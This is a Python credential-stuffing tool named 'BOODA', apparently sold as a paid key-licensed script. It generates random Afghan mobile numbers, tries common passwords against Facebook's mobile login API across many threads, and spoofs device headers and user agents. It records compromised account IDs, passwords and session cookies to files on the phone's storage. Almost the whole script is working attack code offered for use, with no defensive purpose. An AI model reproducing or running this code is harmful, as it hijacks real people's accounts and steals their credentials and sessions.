#Mirwais Danishyar
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python BOODA.py')
print('\n\033[1;37m Cheking for updetes...');time.sleep(3)


print('\n\033[1;33m join my facebook groph');time.sleep(1)
os.system('xdg-open https://www.facebook.com/booda.120130')

logo = """\033[1;32m
`888888b.    .d88888b.   .d88888b.  8888888b.        d8888 
888  "88b  d88P" "Y88b d88P" "Y88b 888  "Y88b      d88888 
888  .88P  888     888 888     888 888    888     d88P888 
8888888K.  888     888 888     888 888    888    d88P 888 
888  "Y88b 888     888 888     888 888    888   d88P  888 
888    888 888     888 888     888 888    888  d88P   888 
888   d88P Y88b. .d88P Y88b. .d88P 888  .d88P d8888888888 
8888888P"   "Y88888P"   "Y88888P"  8888888P" d88P     888 
\033[1;32m------------------------------------------------
 Owner        :  
 AUTHOR       :  𝑴𝑹 𝒀𝑨𝑰𝑺𝑹
 WORKING      :  𝑶𝑵𝑳𝒀 𝑺𝑰𝑴 𝑾𝑶𝑹𝑲𝑰𝑵𝑮
 FRIEND         :  𝑶𝑴𝑰𝑫 𝒁𝑬𝑨 & 𝑰𝑩𝑹𝑨𝑯𝑰𝑴𝑰
 VIRSION      :  1.1
\033[1;37m------------------------------------------------"""
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def approval():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  sxb = 'BOODA'
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/Boodaomido1/approvedone/main/bad').text
    if id in httpCaht:
      print("\033[1;32mYour Key is Successfully Approved")
      time.sleep(0.5)
      msg = str(os.geteuid())
      linex()
      pass
    else:
      print("\033[1;93m YOUR KEY \033[1;37m : \033[1;35m"+id+'-'+sxb)
      #print('\033[1;37m----------------------------------------------')
    #  print("Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")
   #   print('\033[1;37m----------------------------------------------')
      print(' [+] Random crack ') 
      print("\033[1;33m [+] 15-Days Price   : 200")
      print("\033[1;33m [+] 1-Month Price   : 350")
      print ("       Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42m[+] Note: If You Are Free User Don't Come IB\033[0;0m")
   #   print(" Other Countries : 5$ for Weekly  "#)
 #     print(" Other Countries : 15$ For Monthly")
    #  print('\033[1;37m----------------------------------------------')
 #     print(" Easypaisa  Number     : +93792468624")
  #    print(" Trust Wallet Address : 0xb785952B2825366c8756fb65520F7Df8e0D145bD ")
    #  input('\033[1;37m Press Enter For Contact To Admin ')
     # tks = ('Hello%20BOODA%20Sir%20!%20Please%20Approve%20My%20Key%20The%20AFG.PRO%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+93792468624?text='+tks)
      time.sleep(1)
      approval()
  except:
    sys.exit()
approval() 
def menu():
			clear()
			print('\033[1;33m------------------------------------------------')
			print('\033[1;97m[1] RANDOM CLONING\n[2] CREATED BY 𝑩𝑶𝑶𝑫𝑨\n[0] EXIT')
			print('\033[1;33m------------------------------------------------')
			xd=input(' CHOOSE: ')
			if xd in ['1','01']:
				awmafghan()
			if xd in ['02','2']:
				os.system('xdg-open  https://www.facebook.com/booda.120130')
				menu()
				exit()
				menu()
			elif xd in ['0','00']:
				exit(' Thanks ')
			else:
				exit(' OPTION NOT FOUND ...')
def awmafghan():
		user=[]
		clear()
		print('\033[1;33mYour Country Code ,078,077,079,070')
		print('\033[1;37m----------------------------------------------')
		code = input('\033[1;35mPUT CODE: ')
		try:
			limit = int(input('\033[1;33mEXAMPLE: 2000, 3000, 5000, 10000\n\033[1;37mLIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;33m [1]METHODS[1]𝑶𝑵𝑳𝒀 𝑬𝑻𝑰𝑺𝑳𝑨𝑻 𝑾𝑶𝑹𝑲𝑰𝑵𝑮\n [2]METHODS[2] 𝑨𝑳𝑳 𝑨𝑭𝑮 𝑺𝑰𝑴 𝑾𝑶𝑹𝑲𝑰𝑵𝑮')
		print('\033[1;33m------------------------------------------------')
		mthd = input(' CHOOSE: ')
		clear()
		print('\033[1;33m [1]Pass  Afghan Best Api\n [2]Pass  kha')
		print('\033[1;33m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
		
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as AWM:	
			clear()
			tl = str(len(user))
			print('\033[1;35m TOTAL IDS : \033[1;35m'+tl+f' ')
			print(f'\033[1;35m CHOICE CODE  :\033[1;35m '+code)
			print(' \033[1;35mWIAT GOR CLONING STARTED')
			print('\033[1;33m------------------------------------------------')
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','khan12345', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰']
				if pcs in ['2','02']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','khan12345', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰']
				if mthd in ['1','01']:
					AWM.submit(rndm,ids,passlist)
				if mthd in ['2','02']:
					AWM.submit(rndm2,ids,passlist)
		print('\033[1;37m')
		print('\033[1;33m------------------------------------------------')
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		print('\033[1;33m------------------------------------------------')
		input(' Press enter to back ')
		os.system('python bad.py')

enawm1 = ['en_GB','en_US']
awmfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
awmsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat']
modelxxx = ['X677','F98', 'NOTE 2 LTE', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 PRO', 'Hot 10', 'Hot 10 Play', 'Note 4', 'Note 4 Pro', 'Hot 10s', 'Note 5', 'Note 10s NFC', 'Note 5 Stylus', 'Note 6', 'Note 7 LTE', 'Note 7', 'Note 7 Lite', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 Play', 'Hot 12 Play NFC', 'HOT','Note 12 Pro 5G', 'Hot 5', 'Hot 5 Pro', 'Hot 5 NFC', 'Hot 5 LTE', 'Hot 5 Lite', 'Hot 6', 'Hot 6 Pro', 'Hot 6 Lite', 'Hot 6 LTE', 'Hot 6 NFC', 'Hot 7', 'Hot 7 Lite', 'Hot 7 NFC', 'Hot 7 LTE', 'Hot 8', 'Hot 8 Pro', 'Hot 8 NFC', 'Hot 8 LTE', ' Hot 9', 'Hot 9 Pro', 'Hot 9 LTE', ' Hot 9 Lite', 'Hot 9 NFC']
scmodel = ['SC-04A', 'SC-01A', 'SC-02A', 'SC-03A', 'SC-05A', 'SC-06A', 'SC-07A', 'SC-08A', 'SC-09A', 'SC-04B', 'SC-01B', 'SC-02B', 'SC-03B', 'SC-05B', 'SC-06B', 'SC-07B', 'SC-08B', 'SC-09B', 'SC-04C', 'SC-01C', 'SC-02C', 'SC-03C', 'SC-05C', 'SC-06C', 'SC-07C', 'SC-08C', 'SC-09C', 'SC-04D', 'SC-01D', 'SC-02D', 'SC-03D', 'SC-05D', 'SC-06D', 'SC-07D', 'SC-08D', 'SC-09D', 'SC-04E', 'SC-01E', 'SC-02E', 'SC-03E', 'SC-05E', 'SC-06E', 'SC-07E', 'SC-08E', 'SC-09E', 'SC-04F', 'SC-01F', 'SC-02F', 'SC-03F', 'SC-05F', 'SC-06F', 'SC-07F', 'SC-08F', 'SC-09F', 'SC-04G', 'SC-01G', 'SC-02G', 'SC-03G', 'SC-05G', 'SC-06G', 'SC-07G', 'SC-08G', 'SC-09G', 'SC-04H', 'SC-01H', 'SC-02H', 'SC-03H', 'SC-05H', 'SC-06H', 'SC-07H', 'SC-08H', 'SC-09H', 'SC-04I', 'SC-01I', 'SC-02I', 'SC-03I', 'SC-05I', 'SC-06I', 'SC-07I', 'SC-08I', 'SC-09I', 'SC-04J', 'SC-01J', 'SC-02J', 'SC-03J', 'SC-05J', 'SC-06J', 'SC-07J', 'SC-08J', 'SC-09J', 'SC-04K', 'SC-01K', 'SC-02K', 'SC-03K', 'SC-05K', 'SC-06K', 'SC-07K', 'SC-08K', 'SC-09K', 'SC-04L', 'SC-01L', 'SC-02L', 'SC-03L', 'SC-05L', 'SC-06L', 'SC-07L', 'SC-08L', 'SC-09L', 'SC-04M', 'SC-01M', 'SC-02M', 'SC-03M', 'SC-05M', 'SC-06M', 'SC-07M', 'SC-08M', 'SC-09M', 'SC-04N', 'SC-01N', 'SC-02N', 'SC-03N', 'SC-05N', 'SC-06N', 'SC-07N', 'SC-08N', 'SC-09N', 'SC-04O', 'SC-01O', 'SC-02O', 'SC-03O', 'SC-05O', 'SC-06O', 'SC-07O', 'SC-08O', 'SC-09O', 'SC-04Q', 'SC-01Q', 'SC-02Q', 'SC-03Q', 'SC-05Q', 'SC-06Q', 'SC-07Q', 'SC-08Q', 'SC-09Q', 'SC-04S', 'SC-01S', 'SC-02S', 'SC-03S', 'SC-05S', 'SC-06S', 'SC-07S', 'SC-08S', 'SC-09S', 'SC-04Y', 'SC-01Y', 'SC-02Y', 'SC-03Y', 'SC-05Y', 'SC-06Y', 'SC-07Y', 'SC-08Y', 'SC-09Y', 'SC-04Z', 'SC-01Z', 'SC-02Z', 'SC-03Z', 'SC-05Z', 'SC-06Z', 'SC-07Z', 'SC-08Z', 'SC-09Z', ]
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [BOODA-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                awmsim = random.choice(awmsim1)
                                gtt=random.choice(modelxxx)
                                enawm=random.choice(enawm1)
                                awmfban=random.choice(awmfban1)
                                gttt=random.choice(modelxxx)
                                android_version=str(random.randrange(6,13))
                                awm_ua = 'f[FB4A/;FBAV/YZWSES93;FBBV/{application_version};FBAN/FB4A;FBAV/YZWSES93;FBBV/{application_version_code};FBDM//{density=2.0,width=1920,height=2560};FBLC/pl_PL;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Etisalat;FBMF/VIVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5D;FBSV/16;FBOP/6;FBCA/armeabi;FBSS/20;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'machine_id':machine_id,
                                'generate_machine_id':'1',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                head ={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": 'unknown',
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),
                                "X-FB-Net-HNI": str(random.randint(2e4, 4e4)),
                                'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-connection-quality':'EXCELLENT',
                                'X-FB-device-group': '5120',
                                'x-fb-session-id':'Unid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
                                'User-Agent':awm_ua,   
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                "X-FB-Client-IP": "True",
                                "X-Tigon-Is-Retry": "False",
                                "X-FB-Server-Cluster": "True",
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/BOODA-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                                        open('/sdcard/BOODA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;33m [BOODA-OK] '+uid+' | '+pas+'\033[1;97m COOKIE = \033[1;37m'+coki+  '  ''  \033[0;97m')
                                                open('/sdcard/BOODA--OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [BOODA-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,777))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,777))
                                application_version_code=str(random.randint(000000000,777777777))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                awmsim = random.choice(awmsim1)
                                gtt=random.choice(scmodel)
                                enawm=random.choice(enawm1)
                                awmfban=random.choice(awmfban1)
                                gttt=random.choice(scmodel) 
                                android_version=str(random.randrange(6,13))
                                mirwais = 'Mozilla/5.0 (Linux; U; Android 11.0.1; Pixel 4 XL Build/RQ3A.210805.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36 [FBAN/en_US;FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';FBDM/{density=3.0,width=1440,height=3040};FBLC/en_GB;FBRV/'+str(random.randint(000000000,999999999))+str(random.randint(000000000,999999999))+';FBCR/idea;FBMF/Google;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Pixel 4 XL;FBSV/11;FBOP/1;FBCA/arm64-v8a;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'try_num':'1',
                                'credentials_type':'password',
                                'community_id':'',
                                'secure_family_device_id':'',
                                'cpl':'true',
                                'currently_logged_in_userid':'0',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'machine_id':machine_id,
                                'meta_inf_fbmeta':'NO_FILE',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                head={     
                                "X-FB-Connection-Type": 'MOBILE.LTE',
                                'x-fb-connection-quality':'EXCELLENT',
                                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                                'X-FB-device-group': str(random.randint(2e7,3e7)),
                                "X-FB-Friendly-Name": "authenticate",
                                "X-FB-Friendly-Name": "ViewerReactionsMutation",                 
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": mirwais,
                                'x-fb-rmd':'cached=0;state=NO_MATCH',
                                'x-fb-request-analytics-tags':'unknown',
                                "Connection": "Close",
                                "Accept-Encoding": "gzip, deflate",
                                "X-FB-Server-Cluster": "True",
                                "X-Tigon-Is-Retry": "False",
                                "X-FB-Client-IP": "True",
                                 'X-FB-HTTP-Engine': 'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/BOODAOK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;33m [BOODA-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                                        print("Cookie: "+coki) 
                                                        open('/sdcard/BOODA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;33m [BOODA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BOODA-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
                
try:
	menu()
except requests.exceptions.ConnectionError:
	print('No internet connection ...')
	exit()
except:exit()